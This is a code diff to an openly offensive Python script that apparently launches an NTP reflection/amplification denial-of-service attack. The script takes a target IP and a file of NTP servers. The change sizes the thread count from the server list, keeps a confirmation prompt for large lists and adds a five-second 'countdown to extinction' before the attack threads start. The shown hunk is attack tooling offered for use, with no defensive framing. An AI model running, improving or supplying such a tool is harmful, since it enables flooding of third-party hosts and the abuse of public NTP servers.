@@ -90,8 +90,6 @@ if __name__ == "__main__":
 		default=0, type=int)
 	parser.add_argument("-t","--target", help="IP address to perform attack on", dest="target")
 	parser.add_argument("-f","--file", help="File containing the NTP servers", dest="file")
-	parser.add_argument("-T","--threads", dest="threads",
-		help="[Optional] Threads to use for attack, should be the same as the amount of servers, set to 0 for script to figure this out")
 	flags = parser.parse_args()
 	if flags.target:
 		target_address = flags.target
@@ -101,13 +99,6 @@ if __name__ == "__main__":
 		ntpserverfile = flags.file
 	else:
 		ntpserverfile = input("[#] Enter the name of the file containing the list of NTP Servers: ")
-	if flags.threads:
-		numberthreads = flags.threads
-	else:
-		numberthreads = input("[#] Enter the number of threads you want to use(Remember, it should be the same as the list of NTP servers:\n")
-	
-	#Creating and Initializing the list.
-	current_server = 0
 
 	# Performing the file operations to retrieve list of NTP servers
 	print("[#] Reading from provided file")
@@ -115,21 +106,25 @@ if __name__ == "__main__":
 	
 	# Dirty guessing at the amount of threads to be run, also send
 	# a warning before going crazy.
-	if int(numberthreads) == 0:
-		print("[#] Guessing number of servers from list")
-		numberthreads = len(ntplist)
-		if numberthreads > 15:
-			while True:
-				stop_me = input("You are using a large amount of servers, are you sure you wish to proceed? [Y/N] ")
-				if stop_me in ["n","N","no","NO","No"]:
-					print("[!] Exiting")
-					exit()
-				elif stop_me in ["y","Y","yes","YES","Yes"]:
-					print("[!] Hope you know what you are doing, here we go!")
-					break
-				else:
-					print("[X] Incorrect selection")
+	print("[#] Figuring out number of servers from list")
+	numberthreads = len(ntplist)
+	if numberthreads > 15:
+		while True:
+			stop_me = input("You are using a large amount of servers, are you sure you wish to proceed? [Y/N] ")
+			if stop_me.lower() in ["n","no"]:
+				print("[!] Exiting")
+				exit()
+			elif stop_me.lower() in ["y","yes"]:
+				print("[!] Hope you know what you are doing, here we go!")
+				break
+			else:
+				print("[X] Incorrect selection")
 	#Calling the thread function
+	print("[!] Starting in 5 seconds, you still have time to stop this")
+	for i in range(4,-1,-1):
+		print("[!] Countdown to extinction:",i)
+		time.sleep(1)
+
 	thread_function(numberthreads,ntplist,target_address)
 	
 	# In order to avoid utilization 100% CPU, I am adding delay to  the code execution by one second
